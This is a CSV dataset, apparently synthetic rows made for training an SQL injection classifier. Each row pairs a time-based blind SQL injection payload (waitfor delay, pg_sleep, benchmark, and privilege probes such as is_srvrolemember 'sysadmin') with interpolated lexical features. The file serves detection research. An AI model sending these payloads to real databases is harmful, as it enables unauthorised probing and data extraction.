id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.1226121685143848,28.187249781620753,18.484062227025944,4.023032155977999,13.890437336215566,3.4063751091896215,2.7031875545948107,8.187249781620757,0.4917653057547795,0.12332512404018728,0.09728114053667578,0.2876284296683574,2.7031875545948107,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1872497816207561,0.29681244540518903,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.70641434491687,30.444345365130317,15.688869073026064,3.2288993761186697,11.0,0.0,11.755476292104255,7.688869073026064,0.36355578817542417,0.0,0.3835633699081505,0.25288084191642535,0.6888690730260637,0.0,0.0,0.0,0.0,0.6888690730260639,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.6888690730260638,0.6888690730260638,0.0,0.0,0.3111309269739362,0.0,0.6888690730260639,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.5437520329188208,30.388711179397454,21.388711179397458,4.265147995989611,15.510968943517966,2.3667732923615263,2.1222577641205085,10.388711179397456,0.5094549111398233,0.08013963983177716,0.07073519643789192,0.33967025259050765,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,3.510968943517965,0.8777422358794913,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.05250860718320148,119.0,29.68560428086061,4.013874307234806,61.0,4.0,37.0,17.0,0.5126050420168067,0.03361344537815126,0.31092436974789917,0.14285714285714285,4.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.5323085747182404,48.061243631327876,19.39413863478996,3.2717280704671587,12.515310907831967,10.454724771310966,19.272966361747955,5.818241590436989,0.2610770868714845,0.21340284291215736,0.4026927171787113,0.12282735303764683,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8788277269579923,0.0,0.0,0.9394138634789961,0.0,0.0,0.0,0.0,0.9394138634789961,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9394138634789961,0.0,0.0,0.0,0.0,0.0,0.0,0.06058613652100389,0.939413863478996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9394138634789961
SMOTE_000006,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.3389461918468923,85.16345981285393,28.32326919625708,4.136928207635535,43.404999102684044,3.323269196257079,23.465383925141573,14.969807588771236,0.508978668205494,0.04028926989443145,0.2672430488389054,0.18348901306116921,4.0,0.0,2.0,0.0,0.0,0.0,0.0,3.2930767850283145,0.0,0.6767308037429212,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6435067471206848,41.159375006107986,16.210156248473,3.12661392205932,13.0,0.0,17.15937500610799,11.0,0.31637100558934594,0.0,0.415930451219669,0.26769854319098507,0.0,0.21015624847300274,2.0,0.0,0.0,0.0,0.0,3.7898437515269974,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.21015624847300274,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000008,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.399004026707955,38.806184173237625,21.354638129928222,3.9072159239515,15.17731906496411,1.7257730216547036,10.0,11.903092086618814,0.39125730590667146,0.043713470466642715,0.26011689450674336,0.3049123291199425,1.451546043309407,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,4.274226978345297,0.7257730216547035,2.0,0.7257730216547035,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2742269783452965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7257730216547034,0.7257730216547034,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7257730216547036
SMOTE_000009,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.6766512853796507,30.24817215339812,15.348903292038873,3.403501845362754,11.899268861359248,0.0,8.899268861359248,9.449634430679623,0.3933437602063632,0.0,0.29350016330181167,0.31315607649182514,0.0,0.449634430679624,2.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.449634430679624,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44963443067962405
SMOTE_000010,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.5906922773387042,85.40593281008111,27.943220376127414,4.171047455517691,44.545763009019325,4.0,22.602542632891907,14.257627168169886,0.5235514881942799,0.04974505027126957,0.25446375262198506,0.17223970891246548,4.0,0.0,2.0,0.0,0.0,0.0,0.0,3.257627168169887,0.0,0.6855932079575284,1.0,3.3144067920424716,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.3144067920424718,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.314406792042472
